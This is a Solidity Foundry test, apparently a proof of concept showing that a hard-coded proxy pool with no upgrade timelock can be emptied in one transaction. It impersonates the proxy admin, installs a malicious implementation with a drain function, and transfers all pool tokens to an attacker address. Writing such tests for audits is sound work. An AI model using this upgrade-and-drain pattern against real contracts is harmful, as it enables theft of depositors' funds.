// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IProxy {
    function upgradeToAndCall(address, bytes memory) external payable;
}

contract MaliciousImpl {
    function drain(address token0, address token1, address recipient) external {
        uint256 bal0 = IERC20(token0).balanceOf(address(this));
        uint256 bal1 = IERC20(token1).balanceOf(address(this));
        if (bal0 > 0) IERC20(token0).transfer(recipient, bal0);
        if (bal1 > 0) IERC20(token1).transfer(recipient, bal1);
    }
}

contract ExploitTest is Test {
    address constant PROXY = 0x047D41F2544B7F63A8e991aF2068a363d210d6Da;
    bytes32 constant ADMIN_SLOT = 0xB53127684a568b3173Ae13B9f8a6016E243e63B6e8ee1178d6a717850b5d6103;

    function test_adminTakeoverInstantDrain() public {
        address attacker = makeAddr("attacker");

        // Read token addresses and pool balances before attack
        address token0 = IUniswapV2Pair(PROXY).token0();
        address token1 = IUniswapV2Pair(PROXY).token1();

        uint256 poolBal0 = IERC20(token0).balanceOf(PROXY);
        uint256 poolBal1 = IERC20(token1).balanceOf(PROXY);

        require(poolBal0 > 0 || poolBal1 > 0, "No funds in pool");

        // Read proxy admin from EIP1967 slot (simulating compromised admin key)
        address admin = address(uint160(uint256(vm.load(PROXY, ADMIN_SLOT))));

        // Deploy malicious implementation with drain backdoor
        MaliciousImpl maliciousImpl = new MaliciousImpl();

        // Prepare drain calldata
        bytes memory drainData = abi.encodeWithSelector(
            MaliciousImpl.drain.selector,
            token0,
            token1,
            attacker
        );

        // Single atomic transaction: upgrade + drain — no timelock delay
        vm.startPrank(admin);
        IProxy(PROXY).upgradeToAndCall(address(maliciousImpl), drainData);
        vm.stopPrank();

        // Verify all pool funds were drained to attacker
        assertEq(IERC20(token0).balanceOf(attacker), poolBal0, "token0 not fully drained");
        assertEq(IERC20(token1).balanceOf(attacker), poolBal1, "token1 not fully drained");
        assertEq(IERC20(token0).balanceOf(PROXY), 0, "pool still holds token0");
        assertEq(IERC20(token1).balanceOf(PROXY), 0, "pool still holds token1");
    }
}

